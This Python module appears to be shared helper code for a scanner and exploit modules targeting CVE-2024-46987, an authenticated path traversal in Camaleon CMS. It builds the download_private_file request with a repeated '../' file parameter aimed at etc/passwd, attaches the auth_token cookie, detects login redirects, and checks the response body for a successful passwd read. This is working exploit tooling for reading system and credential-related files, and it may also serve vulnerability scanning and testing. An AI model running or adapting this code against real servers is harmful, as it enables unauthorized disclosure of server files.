#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shared helpers for Camaleon CMS CVE-2024-46987 (authenticated path traversal).

Used by scanner and auxiliary modules: URL prefix, download_private_file path,
traversal parameter construction, auth cookies, redirect validation, passwd heuristics.
"""

from __future__ import annotations

from typing import Any, Optional
from urllib.parse import urlencode


def normalize_camaleon_base_path(base_path: Any) -> str:
    """Return normalized mount path without trailing slash (e.g. '' or '/blog')."""
    p = str(base_path or "/").strip()
    if not p.startswith("/"):
        p = "/" + p
    return p.rstrip("/")


def camaleon_page_path(base_path: Any, suffix: str) -> str:
    """Absolute path for a page under the Camaleon mount (e.g. /admin/login)."""
    if not suffix.startswith("/"):
        suffix = "/" + suffix
    pre = normalize_camaleon_base_path(base_path)
    return f"{pre}{suffix}" if pre else suffix


def camaleon_download_private_path(base_path: Any, file_param: str) -> str:
    """Path + query for GET .../admin/media/download_private_file?file=..."""
    q = urlencode({"file": file_param})
    pre = normalize_camaleon_base_path(base_path)
    return f"{pre}/admin/media/download_private_file?{q}"


def traversal_param_for_unix_path(depth: int, server_file: str) -> str:
    """Build file= parameter: ../ * depth + unix path without leading slash."""
    depth = max(1, int(depth or 1))
    p = (server_file or "").strip().lstrip("/")
    return f"{'../' * depth}{p}"


def traversal_param_etc_passwd(depth: int) -> str:
    return traversal_param_for_unix_path(depth, "etc/passwd")


def auth_token_cookie_dict(auth_token: Any) -> dict:
    token = str(auth_token or "").strip()
    if not token:
        return {}
    return {"auth_token": token}


def response_is_admin_login_redirect(resp: Any) -> bool:
    """302 to /admin/login usually means invalid or expired auth_token."""
    if not resp or resp.status_code != 302:
        return False
    loc = (resp.headers.get("Location") or "").lower()
    return "/admin/login" in loc


def response_body_suggests_passwd_read(text: str) -> bool:
    """Heuristic: successful read of /etc/passwd-like content."""
    if not text:
        return False
    if "root:" not in text:
        return False
    return "/bin/" in text or "bin/bash" in text or "bin/sh" in text


def response_ok_for_traversal_probe(resp: Any) -> bool:
    return bool(resp and resp.status_code == 200)
